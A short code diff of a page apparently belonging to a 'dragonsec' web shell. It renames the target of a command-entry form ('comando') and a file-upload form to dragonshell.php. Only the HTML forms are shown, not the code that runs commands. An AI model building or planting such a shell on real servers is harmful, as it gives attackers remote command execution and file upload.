@@ -18,14 +18,14 @@ p {
 <p align="center"><img src="http://dragonsec.info/img/dragonsec-logo-04.png" height="20%" width="20%"></img></p>
 
 <div>
-<form method="GET" action="dragonsec.php" align="center">
+<form method="GET" action="dragonshell.php" align="center">
 <input type="text" name="comando">
 <input type="submit" value="X"></form>
 
 <br>
 
 
-<form action="dragonsec.php" method="post" enctype="multipart/form-data" align="center">
+<form action="dragonshell.php" method="post" enctype="multipart/form-data" align="center">
 <input type="file" name="subir_archivo" id="subir_archivo"></input>
 <input type="submit" value="X"></input></form>
 
